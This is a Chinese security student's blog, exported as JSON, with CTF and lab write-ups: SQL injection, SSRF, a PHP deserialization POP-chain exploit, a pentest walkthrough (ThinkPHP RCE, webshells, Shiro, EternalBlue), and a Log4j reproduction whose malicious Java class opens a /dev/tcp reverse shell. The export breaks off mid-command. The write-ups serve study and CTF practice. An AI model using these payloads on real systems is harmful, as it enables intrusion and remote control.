{"meta":{"title":"孤独星球","subtitle":"H3h3QAQの博客","description":"本科 | 软件工程 | 网络安全","author":"H3h3QAQ","url":"http://h3geeker.top","root":"/"},"pages":[{"title":"404","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.525Z","comments":true,"path":"404.html","permalink":"http://h3geeker.top/404.html","excerpt":"","text":""},{"title":"","date":"2021-11-10T11:35:46.649Z","updated":"2021-11-10T11:35:46.649Z","comments":true,"path":"baidu_verify_xxxxxxx.html","permalink":"http://h3geeker.top/baidu_verify_xxxxxxx.html","excerpt":"","text":"wvlc3L96QK"},{"title":"","date":"2021-11-10T11:35:46.652Z","updated":"2021-11-10T11:35:46.652Z","comments":true,"path":"google1xxxxxxx0.html","permalink":"http://h3geeker.top/google1xxxxxxx0.html","excerpt":"","text":"google-site-verification: google110e5e5e14c8dcf0.html"},{"title":"放松一下","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.541Z","comments":true,"path":"List/index.html","permalink":"http://h3geeker.top/List/index.html","excerpt":"","text":"影音资源共享"},{"title":"about","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.648Z","comments":true,"path":"about/index.html","permalink":"http://h3geeker.top/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.649Z","comments":true,"path":"categories/index.html","permalink":"http://h3geeker.top/categories/index.html","excerpt":"","text":""},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.648Z","comments":true,"path":"archives/index.html","permalink":"http://h3geeker.top/archives/index.html","excerpt":"","text":""},{"title":"留言板","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-14T14:28:40.892Z","comments":true,"path":"contact/index.html","permalink":"http://h3geeker.top/contact/index.html","excerpt":"","text":"畅所欲言 在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！ 友链 H3h3QAQの友链信息 博客名称: H3h3QAQの博客 博客网址: http://h3geeker.top/ 博客介绍: The harder you work, the luckier you will be"},{"title":"统计","date":"2020-10-31T02:11:28.000Z","updated":"2021-11-10T11:35:46.650Z","comments":true,"path":"census/index.html","permalink":"http://h3geeker.top/census/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-07-19T08:42:10.000Z","updated":"2021-11-10T11:35:46.651Z","comments":true,"path":"friends/index.html","permalink":"http://h3geeker.top/friends/index.html","excerpt":"","text":""},{"title":"资源分享","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.652Z","comments":true,"path":"resource/index.html","permalink":"http://h3geeker.top/resource/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-11-10T13:59:42.424Z","updated":"2021-11-10T13:59:42.424Z","comments":true,"path":"tags/index.html","permalink":"http://h3geeker.top/tags/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.542Z","comments":true,"path":"List/music/index.html","permalink":"http://h3geeker.top/List/music/index.html","excerpt":"","text":""},{"title":"相册","date":"2021-11-10T11:35:46.532Z","updated":"2021-11-10T11:35:46.532Z","comments":true,"path":"List/galleries/index.html","permalink":"http://h3geeker.top/List/galleries/index.html","excerpt":"","text":""},{"title":"视频","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.542Z","comments":true,"path":"List/movies/index.html","permalink":"http://h3geeker.top/List/movies/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.543Z","comments":true,"path":"List/tools/index.html","permalink":"http://h3geeker.top/List/tools/index.html","excerpt":"","text":""},{"title":"乖巧小狗","date":"2021-11-10T11:35:46.533Z","updated":"2021-11-10T11:35:46.533Z","comments":true,"path":"List/galleries/乖巧小狗/index.html","permalink":"http://h3geeker.top/List/galleries/%E4%B9%96%E5%B7%A7%E5%B0%8F%E7%8B%97/index.html","excerpt":"","text":""},{"title":"二次元风","date":"2021-11-10T11:35:46.534Z","updated":"2021-11-10T11:35:46.534Z","comments":true,"path":"List/galleries/二次元风/index.html","permalink":"http://h3geeker.top/List/galleries/%E4%BA%8C%E6%AC%A1%E5%85%83%E9%A3%8E/index.html","excerpt":"","text":""},{"title":"动漫人物","date":"2021-11-10T11:35:46.535Z","updated":"2021-11-10T11:35:46.535Z","comments":true,"path":"List/galleries/动漫人物/index.html","permalink":"http://h3geeker.top/List/galleries/%E5%8A%A8%E6%BC%AB%E4%BA%BA%E7%89%A9/index.html","excerpt":"","text":""},{"title":"动漫插画","date":"2021-11-10T11:35:46.535Z","updated":"2021-11-10T11:35:46.535Z","comments":true,"path":"List/galleries/动漫插画/index.html","permalink":"http://h3geeker.top/List/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/index.html","excerpt":"","text":""},{"title":"动漫风景","date":"2021-11-10T11:35:46.536Z","updated":"2021-11-10T11:35:46.536Z","comments":true,"path":"List/galleries/动漫风景/index.html","permalink":"http://h3geeker.top/List/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"呆萌猫咪","date":"2021-11-10T11:35:46.537Z","updated":"2021-11-10T11:35:46.537Z","comments":true,"path":"List/galleries/呆萌猫咪/index.html","permalink":"http://h3geeker.top/List/galleries/%E5%91%86%E8%90%8C%E7%8C%AB%E5%92%AA/index.html","excerpt":"","text":""},{"title":"城市风光","date":"2021-11-10T11:35:46.538Z","updated":"2021-11-10T11:35:46.538Z","comments":true,"path":"List/galleries/城市风光/index.html","permalink":"http://h3geeker.top/List/galleries/%E5%9F%8E%E5%B8%82%E9%A3%8E%E5%85%89/index.html","excerpt":"","text":""},{"title":"清新花卉","date":"2021-11-10T11:35:46.538Z","updated":"2021-11-10T11:35:46.538Z","comments":true,"path":"List/galleries/清新花卉/index.html","permalink":"http://h3geeker.top/List/galleries/%E6%B8%85%E6%96%B0%E8%8A%B1%E5%8D%89/index.html","excerpt":"","text":""},{"title":"炫酷跑车","date":"2021-11-10T11:35:46.539Z","updated":"2021-11-10T11:35:46.539Z","comments":true,"path":"List/galleries/炫酷跑车/index.html","permalink":"http://h3geeker.top/List/galleries/%E7%82%AB%E9%85%B7%E8%B7%91%E8%BD%A6/index.html","excerpt":"","text":""},{"title":"璀璨星空","date":"2021-11-10T11:35:46.540Z","updated":"2021-11-10T11:35:46.540Z","comments":true,"path":"List/galleries/璀璨星空/index.html","permalink":"http://h3geeker.top/List/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/index.html","excerpt":"","text":""},{"title":"甜美食品","date":"2021-11-10T11:35:46.540Z","updated":"2021-11-10T11:35:46.540Z","comments":true,"path":"List/galleries/甜美食品/index.html","permalink":"http://h3geeker.top/List/galleries/%E7%94%9C%E7%BE%8E%E9%A3%9F%E5%93%81/index.html","excerpt":"","text":""},{"title":"自然风景","date":"2021-11-10T11:35:46.541Z","updated":"2021-11-10T11:35:46.541Z","comments":true,"path":"List/galleries/自然风景/index.html","permalink":"http://h3geeker.top/List/galleries/%E8%87%AA%E7%84%B6%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""}],"posts":[{"title":"【XCTF】第四期个人能力认证考核个人wp","slug":"*CTF wp","date":"2022-04-16T02:24:13.914Z","updated":"2022-04-18T07:57:46.568Z","comments":true,"path":"posts/925c2943.html","link":"","permalink":"http://h3geeker.top/posts/925c2943.html","excerpt":"","text":"Grey修改图片长度，然后用Stegsolve，在Alpha3通道可以看到两段flag 然后在010末尾可以看到m3_1F 连起来，flag：*CTF{Catch_m3_1F_y0u_cAn} oh-my-grafanaCVE-2021-43798，Grafana任意文件读取漏洞 读取Grafana配置文件拿到用户名，密码，登陆 登陆后发现注入点，尝试注入，发现毫无过滤。。。直接一把梭 select group_concat(table_name) from information_schema.tables where table_schema = database() select group_concat(column_name) from information_schema.columns where table_schema = database() select flag from fffffflllllllllaaaagggggg flag：*ctf{Upgrade_your_grafAna_now!} babyweb 这里能够请求资源，尝试请求本地资源发现有waf 题目告诉了flag在/flag中 访问提示需要ip为127.0.0.1，也就是内网ip 第一反应想的是，写一个js，读取flag，并且弹出来 尝试不行，因为还是前端请求，随即想到了302跳转的方法 主页给了下载资源的地方，在自己的vps上用php写一个302跳转，并且起一个php服务（php -S port） &lt;?php header(\"location:http://127.0.0.1:8089/flag\") ?&gt; 然后让服务端请求你的跳转，跳转到http://127.0.0.1:8089/flag，这时候就是内网资源请求，成功完成一次服务端请求伪造 然后访问下载到的资源，成功拿到flag flag：*ctf{A_Easy_SSRF_YOU_KNOW}","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"大赛wp","slug":"大赛wp","permalink":"http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"}]},{"title":"POP链初探","slug":"POP链构造基础","date":"2022-03-06T10:24:48.088Z","updated":"2022-03-26T04:38:07.333Z","comments":true,"path":"posts/4458d455.html","link":"","permalink":"http://h3geeker.top/posts/4458d455.html","excerpt":"","text":"POP链基础Author：H3h3QAQ 之前我写了一篇PHP反序列化的基础文章 接下来我打算记录一下我的POP链构造学习过程 首先我们需要一些了解一些基础知识 一、POP和POP链的定义1、什么是POP面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。 2、POP链原理POP链是反序列化漏洞利用中的一种常有方法，即寻找程序环境中已经定义或能够动态加载的对象中的属性或函数，将一些能够被调用的函数组合起来，达到目的的操作。 二、POP链构造初探在简单的反序列化漏洞利用中，我们通常寻找在源码中找寻找可以利用的魔术方法，但是关键利用点并不是魔术方法中，而是在类的方法中，在此时如果有多个类，存在可以RCE的函数，我们就可以尝试去寻找存在我们可控的变量的POP链来将其串联起来，从而达到攻击的目的。 1、简单的POP链构造三部曲接下来，我们给一个简单的环境，更有利于理解 &lt;?php show_source(__FILE__); class Lemon { protected $a; function __construct() { $this-&gt;a = new H3(); } function __destruct() { $this-&gt;a-&gt;action(); } } class H3 { function action() { echo \"I want to play basketball!\"; } } class Hack { private $data; function H3() { eval($this-&gt;data); } } unserialize($_GET['eval']); 这就是一个简单的环境，我们需要利用到Hack类中的action方法中的eval()达成RCE 接下来我们温习一下魔术方法： __destruct()：//析构函数当对象被销毁时会被自动调用 __wakeup(): //unserialize()时会被自动调用 __invoke(): //当尝试以调用函数的方法调用一个对象时，会被自动调用 __call(): //在对象上下文中调用不可访问的方法时触发 __callStatci(): //在静态上下文中调用不可访问的方法时触发 __get(): //用于从不可访问的属性读取数据 __set(): //用于将数据写入不可访问的属性 __isset(): //在不可访问的属性上调用isset()或empty()触发 __unset(): //在不可访问的属性上使用unset()时触发 __toString(): //把类当作字符串使用时触发 __construct(): //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 __sleep(): //serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用 环境中用到了__construct()和__destruct()魔术方法，我们需要牢记住每个魔术方法在什么情况下被触发。 我们来分析一下Lemon类 class Lemon { protected $a; function __construct() { $this-&gt;a = new H3(); } function __destruct() { $this-&gt;a-&gt;action(); } } 当Lemon类被new的时候会调用__construct()从而newH3类，然后会触发__destruct()方法，把a的指传给action() 但是H3类中并没有我们能够利用的的地方，我们接下来看Hack类 class Hack { private $data; function action() { eval($this-&gt;data); } } 该类中有eval函数，可以被利用 到此我们的POP链已经很明确了，利用Lemon 类中的魔术方法去实例化Hack类，从而执行eval()，并且参数可控 exp如下： &lt;?php class Lemon { protected $a; function __construct() { $this-&gt;a = new Hack(); } } class Hack { private $data=\"system('whoami');\"; } $a=new Lemon(); echo urlencode(serialize($a)); ?&gt; payload： O%3A5%3A%22Lemon%22%3A1%3A%7Bs%3A4%3A%22%00%2A%00a%22%3BO%3A4%3A%22Hack%22%3A1%3A%7Bs%3A10%3A%22%00Hack%00data%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D%7D 执行结果： 这就完成了一个简单的POP链构造 2、CTF题目中的POP链构造经典题目Ezpop &lt;?php class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ //当脚本尝试将对象调用为函数时触发 $this-&gt;append($this-&gt;var); } } class Show{ public $source; public $str; public function __construct($file='index.php'){ // 当一个对象创建时被调用 $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\"; } public function __toString(){ //当一个对象被当作一个字符串被调用 return $this-&gt;str-&gt;source; } public function __wakeup(){ //使用unserialize时触发 if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker\"; $this-&gt;source = \"index.php\"; } } } class Test{ public $p; public function __construct(){ // 当一个对象创建时被调用 $this-&gt;p = array(); } public function __get($key){ //用于从不可访问的属性读取数据 $function = $this-&gt;p; return $function(); } } if(isset($_GET['pop'])){ @unserialize($_GET['pop']); } else{ $a=new Show; highlight_file(__FILE__); } ?&gt; 为了便于观看，我把每个魔术方法都做了注释在上面 接下来分析一下 class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ //当脚本尝试将对象调用为函数时触发 $this-&gt;append($this-&gt;var); } } 我们可以利用Modifier类来包含到flag.php class Show{ public $source; public $str; public function __construct($file='index.php'){ // 当一个对象创建时被调用 $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\"; } public function __toString(){ //当一个对象被当作一个字符串被调用 return $this-&gt;str-&gt;source; } public function __wakeup(){ //使用unserialize时触发 if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker\"; $this-&gt;source = \"index.php\"; } } } 然后再利用Show类输出flag 接下来我们来找一下POP链 从__wakeup()开始（或者说从Show类开始） public function __wakeup(){ //使用unserialize时触发 if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker\"; $this-&gt;source = \"index.php\"; } } __wakeup()先对字符串做比较，如果$this-&gt;source为Show类，则会触发__toString()魔术方法 public function __toString(){ //当一个对象被当作一个字符串被调用 return $this-&gt;str-&gt;source; } __toString()方法会访问str中的source，如果str是Test类则会触发__get() public function __get($key){ //用于从不可访问的属性读取数据 $function = $this-&gt;p; return $function(); } 可以看到，在__get()魔术方法中，p作为函数来使用，我们可以来实例化Modifier类，从而触发__invoke()方法 &lt;?php class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ //当脚本尝试将对象调用为函数时触发 $this-&gt;append($this-&gt;var); } } 至此，我们已经找到了一个完整的POP链 然后就可以伪协议配合include来把flag读出来 exp如下： &lt;?php class Modifier { protected $var = \"php://filter/convert.base64-encode/resource=flag.php\"; } class Show{ public $source; public $str; public function __construct($file){ $this-&gt;source = $file; } public function __toString(){ return \"H3\"; } } class Test{ public $p; public function __construct(){ $this-&gt;p = new Modifier(); } } $a = new Show(' '); $a-&gt;str= new Test(); $h3 = new Show($a); echo urlencode(serialize($h3)); 将其base64解码后成功拿到flag 3、真实环境下的POP链构造这里选择了CVE-2019-9081 Laravel5.7 反序列化 RCE进行复现 对于初学者，我建议复现一下Thinkphp和Laravel几个反序列化洞 在复现的过程中跟着作者的思路，可以很好的体会一下POP链子构造的方法和技巧 因为之前已经复现过，并且在看雪发过文章了，这里就贴个链接QAQ https://bbs.pediy.com/thread-270904.htm 三、总结相信通过了本篇文章，对于对POP链构造的初学者，能够提供一个简单快速的入手方法 POP链构造在真实环境下经常要“跳来跳去”，这就对挖掘者的耐心和技巧是个非常大的考验，但是如果成功挖掘出一条链子后，感觉非常的爽～ 而面对这些，就需要大家对于魔术方法掌握牢固，并且对于这种构造思想也要灵活运用，不能太过死板，而且在挖链子的过程中也会有一些小技巧，这些就需要大家自行收集了，本篇文章就不过多赘述咯 参考链接： https://v0w.top/2020/03/05/unsearise-POP/#2-2-%E7%94%A8%E4%B8%80%E4%B8%AA%E5%AE%9E%E4%BE%8B%E8%AF%B4%E6%98%8E%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0POP%E9%93%BE http://h3geeker.top/posts/ae3250a1.html#toc-heading-2 https://bbs.pediy.com/thread-270904.htm https://www.sec-in.com/article/1094","categories":[{"name":"学习","slug":"学习","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"【萌新向】渗透测试靶场考核","slug":"渗透考核","date":"2022-01-10T02:03:16.000Z","updated":"2022-01-10T02:03:16.000Z","comments":true,"path":"posts/27d77a69.html","link":"","permalink":"http://h3geeker.top/posts/27d77a69.html","excerpt":"","text":"最近年末了，单位有了渗透的考核 对于我这个几乎没有玩过内网的同学简直是非常难过！ 靶场搭建再了单位的一台Thinkpad上，但是！路由器经常会炸，在后面我会解释一下为啥提前说一下这个 由于时间短，我没有完成整个渗透的过程，就简单记录一下渗透学习 接下来说明一下整个靶场的拓扑 我们首先假装一下，该环境是在公网环境下 有两个web服务 一个域控 两个域用户 WEB1是给出来的：http://192.168.8.128:8081/ 剩下的我们逐步收集 WEB1为：http://192.168.8.128:8081/ 访问发现web应用是tp框架 且版本为v5.0.x 随便给一个指，造成debug看一下报错页面给没给版本号 可以看到，该Think版本为V5.0.15，此时可以利用工具或者手测一下 经过测试存在ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞 随便上一个webshell并且用蚁剑连接一下，连接后可以看到还有其他的同事也上了一句话（我的马是H3.php,就是简单的一句话） 然后上传冰蝎木马（其实这一步有点多余了，我本来想要为了方便提权，和利用msf，但是发现这里并不需要特别高的权限） 利用命令执行，反弹shell到自己的kali中，进行后渗透工作 在这里成功反弹到了shell，接下来就可以继续信息收集 上传一个fscan 扫一下c段，发现了web2的服务，并且看到了web2的服务器有着双网卡，这里先放在这不动 发现了不同段的ip扫一下，发现是不出网，frp带出来，发现是个Tomcat的样例界面，此时又陷入了僵局，因为在我的印象中这玩意没有啥利用的地方（这里服务器崩了一次，导致IP和我扫到的地方不一样，小问题） 看到了445想打永恒之蓝打不通（这里忘记截屏了），随即扫一下目录看看有没有其他的东西 扫到了admin，访问一下 大写的Shiro（Shiro和Log4j养活了大堆安全人员 滑稽脸.jpg） 而且bp的插件直接给了key，这就不用问多说了把 直接进行shiro_attack，干他！ 查看网卡 Windows IP 配置 以太网适配器 Ethernet0: 连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::c900:af0f:9fe0:d91c%13 IPv4 地址 . . . . . . . . . . . . : 192.168.251.112 子网掩码 . . . . . . . . . . . . : 255.255.254.0 默认网关. . . . . . . . . . . . . : 192.168.250.1 以太网适配器 Ethernet1: 连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::310a:8deb:67a7:832d%12 IPv4 地址 . . . . . . . . . . . . : 10.10.10.4 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . : 隧道适配器 isatap.{B0A725AE-0F5A-475D-B790-B922E4F0ECBB}: 媒体状态 . . . . . . . . . . . . : 媒体已断开 连接特定的 DNS 后缀 . . . . . . . : 隧道适配器 isatap.{F5E4AD16-A6C6-4F43-B6C5-F927AEBD7A45}: 媒体状态 . . . . . . . . . . . . : 媒体已断开 连接特定的 DNS 后缀 . . . . . . . : 尝试注入内存马无效，可以利用cs上线 利用shiro RCE 加上cs的powershell 上线 成功将目标机器上线（你会发现这里的ip又变回同段了，因为实在是路由器遭不住那么多的穿透直接凉了，经过讨论把web2放开直接打） 看一下网卡 发现了不同A段的IP地址 fscan扫一下 10.10.10.3:139 open 10.10.10.4:139 open 10.10.10.4:8080 open 10.10.10.6:445 open 10.10.10.3:445 open 10.10.10.4:445 open 10.10.10.6:139 open 10.10.10.6:135 open 10.10.10.3:135 open 10.10.10.4:135 open NetInfo: [*]10.10.10.4 [-&gt;]Windows2012 [-&gt;]192.168.8.142 [-&gt;]10.10.10.4 NetInfo: [*]10.10.10.6 [-&gt;]Windows2008 [-&gt;]10.10.10.6 [*] WebTitle:http://10.10.10.4:8080 code:200 len:20 title:Apache Tomcat/8.5.73 [*] 10.10.10.4 WORKGROUP\\WINDOWS2012 Windows Server 2012 R2 Standard 9600 NetInfo: [*]10.10.10.3 [-&gt;]Win7 [-&gt;]10.10.10.3 [*] 10.10.10.6 HACK\\WINDOWS2008 Windows Server 2008 R2 Standard 7601 Service Pack 1 [+] 10.10.10.3 MS17-010 (Windows 7 Ultimate 7601 Service Pack 1) [*] 10.10.10.6 (Windows Server 2008 R2 Standard 7601 Service Pack 1) [*] 10.10.10.3 \u0001\u0002__MSBROWSE__\u0002\\WIN7 Windows 7 Ultimate 7601 Service Pack 1 传一个nps，做内网穿透，带到自己主机里（这里也是自己想要学习一下nps，内网我很菜，基本上没打过） 成功带出来了 回到上文的fscan扫描结果可以看到这里有一个Win7 而且445也是打开的（这我就太懂了） 直接考虑永恒之蓝！ 存在永恒之蓝漏洞，那还说啥了！干他！！！！ 可以看到，我这里打了tm的15次，换了各种版本的exp，但是都无法连接成功利用，此时已经快要下班了 233333 不出众望，在第30+次的时候 它蓝屏了。。。。。 然后我也就下班了，我的第一次渗透就到这里了，如果这个域用户成功打穿了，也许能有可能进行横移，拿域控（边看大师傅的blog，边问我师傅，我很菜2333），不过这次的渗透给了我很大的启发。 第一点、对于刚刚接触的同学们，一定要做好信息收集的工具，能够在信息收集的阶段在自己的脑袋里形成一幅拓扑图 第二点、要熟悉常见的渗透工具：msf、cs、nmap、fsacn等等 第三点、要对渗透常用CVE漏洞学会利用和提权手法，比如永恒之蓝 第四点、要会内网穿透和多层代理，这个很多师傅都写了文章可以学习学习 学习永无止境，要多练习，多思考，经验很有用，纸上谈学不如动手实践，对于我一个CTFer来说，内网的知识接触很少，但是在整个靶场的渗透途中，把每个步骤都细分，这样就有了很明确的目的，也就把一个大目标划分成小目标，按照步骤来，遇到不会的东东就去现场学习并且整理笔记，就会容易得多。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://h3geeker.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://h3geeker.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"长安“战疫”网络安全卫士守护赛 部分wp","slug":"长安战疫","date":"2022-01-08T12:23:22.867Z","updated":"2022-01-08T12:43:34.195Z","comments":true,"path":"posts/5b82dfff.html","link":"","permalink":"http://h3geeker.top/posts/5b82dfff.html","excerpt":"","text":"八卦迷宫折磨！！！！ cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang} RCE_No_ParaPHP无参数RCE 参考自：https://blog.csdn.net/qq_38154820/article/details/106329976 if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) 代码会将$_GET[‘code’]中满足正则/[^\\W]+((?R)?)/的部分，替换为空，然后查看是否剩下的部分强等于,如果满足，则执行 第二层bypass if(!preg_match('/session|end|next|header|dir/i',$_GET['code'])) 对几个关键词进行了过滤 发现end被过滤了 所以用array_rand()函数代替end() payload为： /?code=eval(array_rand(current(get_defined_vars())));&amp;system(\"ls\"); 发现了php 直接cat 即可 西安加油一到流量题 看了一下没发现什么 导出全部的http对象 发现了两个文件 把两个txt文本的内容都放到CyberChef解码 看起来secret.txt是压缩包，推断压缩包中的内容就是图片 还原压缩包文件 按照提示的内容拼图 flag： cazy{make_XiAN_great_Again} Shiro?一开始以为是shiro 就利用shiro attack 但是发现并能干什么，只能执行几个命令（这个莫名的jar也是很可疑） 此时我随便输入用户名密码 发现都是ok 此时高度怀疑log4jRCE 然后尝试了一下反弹shell，发现有过滤，但是不知道什么过滤 经过测试发现是jndi被过滤了，而且可以大小写绕过 直接Log4j干他！ 朴实无华的取证确实朴实无华 文件名给了系统信息直接vol取证 先看一下内存里有什么文件 （贴一下经过我筛选的文件） 0x0000000001b301c0 1 0 RW-r-- \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\桌面\\我的日记.txt.txt 0x0000000001b34f90 1 1 R--r-- \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\桌面\\flag.zip 0x0000000001e65028 1 0 R--rw- \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\桌面\\flag.png 分别打开看一下 flag.png 一串意义不明的字符串以及出题人美画！ flag.zip 加密过的一个压缩包 我的日记.txt 这里给了部分的加密脚本 图片中的字符串 FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF] 凯撒了一下，发现有蹊跷在里面 此时我们可以判断这个加密是加密脚本+凯撒 剩下的就是测试找规律 贴一下exp str = \"FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]\" str = [a for a in str] for a in range(0,len(str)): str[a] = chr(ord(str[a])+32) #fdcb{Xldq_zloo_fhuwdlqob_vxffhhg_lq_iljkwlqj_wkh_hslghplf} for a in range(0,len(str)): if str[a] &gt;= \"d\" and str[a]&lt;=\"z\": str[a] = chr(ord(str[a])-3) elif str[a]=='a': str[a]='x' elif str[a]=='b': str[a]='y' elif str[a]=='c': str[a]='z' elif str[a]=='|': str[a]=\"_\" str = \"\".join(str) print(str) #cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"大赛wp","slug":"大赛wp","permalink":"http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"}]},{"title":"2021SCTF-Loginme","slug":"Loginme","date":"2021-12-28T01:32:57.167Z","updated":"2021-12-28T01:47:08.363Z","comments":true,"path":"posts/54f35dc.html","link":"","permalink":"http://h3geeker.top/posts/54f35dc.html","excerpt":"","text":"最近也是刚刚放假，比较忙，就看了看这个SCTF 比赛快到尾声的时候才抽出空来看看题 按照惯例，肯定是要看看分最少的题 这道题被我看中了，我打算研究一下这个题 附件是一份源码，而且是go语言的源码 我们来看一看 题中源码给了middleware.go 此时我们应该理解一下go语言的中间件是起到什么作用的 有时候在执行实际Handler里面的逻辑的时候想要预处理或者后处理一些行为（比如写入log、统计执行时间等等）；有时候我们想要在调用一个Handler之前或之后调用另一个Handler。这时我们就需要用到中间件这个中间处理函数，把我们实际使用的Handler放在中间件里面，以实现额外的功能。 所以我们先来看看middleware.go定义了什么 package middleware import ( \"github.com/gin-gonic/gin\" ) func LocalRequired() gin.HandlerFunc { return func(c *gin.Context) { if c.GetHeader(\"x-forwarded-for\") != \"\" || c.GetHeader(\"x-client-ip\") != \"\" { c.AbortWithStatus(403) return } ip := c.ClientIP() if ip == \"127.0.0.1\" { c.Next() } else { c.AbortWithStatus(401) } } } 这里导入了一个包github.com/gin-gonic/gin 我们来看一下该包的描述 Gin is a web framework written in Go (Golang). It features a martini-like API with performance that is up to 40 times faster thanks to httprouter. If you need performance and good productivity, you will love Gin. ------------------------------------------------------------------------------- Gin 是一个用 Go (Golang) 编写的 Web 框架。 它具有类似martini-like的 API，由于 httprouter，性能提高了 40 倍。 如果您需要性能和良好的生产力，您会喜欢 Gin。 到这里其实就有那么一点能感觉到这个题的做法了 接着往下看 func LocalRequired() gin.HandlerFunc { return func(c *gin.Context) { if c.GetHeader(\"x-forwarded-for\") != \"\" || c.GetHeader(\"x-client-ip\") != \"\" { c.AbortWithStatus(403) return } ip := c.ClientIP() if ip == \"127.0.0.1\" { c.Next() } else { c.AbortWithStatus(401) } } } 这里就是简单的获取数据头的函数 其中 if c.GetHeader(\"x-forwarded-for\") != \"\" || c.GetHeader(\"x-client-ip\") != \"\" { c.AbortWithStatus(403) return } 这里定义到如果存在x-forwarded-for或者x-client-ip就会返回403 但是还需要ip == \"127.0.0.1\" 百度一下就知道x-real-ip这个头 中间件看完了，接着往下看route.go 这里就能看到端倪了 go语言模板渲染支持传入一个结构体的实例来渲染它的字段，就有可能造成信息泄露 而在route.go中恰巧传入了一个结构体，我们接着看structs.go 到这里已经真相大白了 1、首先构造ip伪造 2、在age变量中存在ssti信息泄露出flag 3、干他！","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"大赛wp","slug":"大赛wp","permalink":"http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"}]},{"title":"CTFSHOWLog4j复现","slug":"CTFSHOWlog4j复现wp","date":"2021-12-10T15:10:21.792Z","updated":"2021-12-10T15:59:48.785Z","comments":true,"path":"posts/b8d6ddff.html","link":"","permalink":"http://h3geeker.top/posts/b8d6ddff.html","excerpt":"","text":"今天上午刚刚看完这个洞，自己复现了一下，晚上就看到了上题正好打一下玩玩 多明显的输入框，嘿嘿嘿 这不得来一个 ${jndi:ldap://dnslog.com/exp} (bushi 0x01 准备工作首先准备好恶意Java类 public class Test { static{ try { Runtime r = Runtime.getRuntime(); String cmd[]= {\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/xxx/50025;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done\"}; Process p = r.exec(cmd); p.waitFor(); }catch (Exception e){ e.printStackTrace(); } } } 能弹shell就行，怎么写都行 然后准备好marshalsec-0.0.3-SNAPSHOT-all.jar 0x02 监听端口nc -lvnp 50025 0x03 起http服务python3 -m http.server 50026 注意这里要在恶意Java类的目录下起http服务 0x04 起LDAP服务java -cp 